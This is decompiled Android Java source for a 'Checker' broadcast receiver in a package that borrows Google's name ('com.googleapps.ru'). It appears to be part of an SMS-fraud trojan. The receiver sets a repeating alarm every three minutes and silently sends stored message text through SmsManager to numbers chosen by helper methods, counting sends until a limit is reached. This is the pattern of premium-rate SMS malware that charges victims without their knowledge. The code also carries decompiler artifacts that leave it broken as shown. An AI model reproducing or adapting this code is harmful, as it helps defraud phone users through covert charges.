package com.googleapps.ru;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.telephony.SmsManager;

public class Checker
  extends BroadcastReceiver
{
  public static final String ACTION = "com.googleapps.ru.CHECK";
  
  public Checker() {}
  
  static void scheduleChecking(Context paramContext)
  {
    Object localObject = new Intent(paramContext, Checker.class);
    TextUtils.putSettingsValue(paramContext, "IS_SENT_KEY", "SENT_IS_NOT_OK", paramContext.getSharedPreferences("PREFERENCES", 0));
    ((Intent)localObject).setAction("com.googleapps.ru.CHECK");
    localObject = PendingIntent.getBroadcast(paramContext, 0, (Intent)localObject, 268435456);
    ((AlarmManager)paramContext.getSystemService("alarm")).set(0, System.currentTimeMillis() + 180000L, (PendingIntent)localObject);
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    Object localObject = paramContext.getSharedPreferences("PREFERENCES", 0);
    int i = ((SharedPreferences)localObject).getInt("SENT_SMS_COUNT_KEY", 0);
    paramIntent = SmsManager.getDefault();
    if (!"SENT_IS_NOT_OK".equals(((SharedPreferences)localObject).getString("IS_SENT_KEY", "SENT_IS_NOT_OK")))
    {
      if (((!Activator.IS_MF) && (i < 2)) || ((Activator.IS_MF) && (i < 1)))
      {
        localObject = ((SharedPreferences)localObject).getString("KEY_MSG_TEXT", "");
        Msg.start(paramIntent, null, Activator.getPortSchemeByNumber(Activator.NUMBER10), (String)localObject);
        scheduleChecking(paramContext);
        return;
      }
      if ((!Activator.IS_MF) && (i == 2))
      {
        localObject = ((SharedPreferences)localObject).getString("KEY_MSG_TEXT", "");
        Msg.start(paramIntent, null, Activator.getPortSchemeByNumber(Activator.NUMBER5), (String)localObject);
        scheduleChecking(paramContext);
        return;
      }
      TextUtils.putSettingsValue(paramContext, "SENT_SMS_COUNT_KEY", 0, (SharedPreferences)localObject);
      return;
    }
    paramIntent = new Activator(paramContext, ((SharedPreferences)localObject).getString("NET_OP", ""));
    if (!paramIntent.wasInitError())
    {
      if (i != 0) {
        break label196;
      }
      paramIntent.send("5-3-1", null);
    }
    for (;;)
    {
      TextUtils.putSettingsValue(paramContext, "SENT_SMS_COUNT_KEY", 0, (SharedPreferences)localObject);
      return;
      label196:
      if (i == 1) {
        paramIntent.send("5-3", null);
      } else if (i == 2) {
        paramIntent.send("3", null);
      }
    }
  }
}
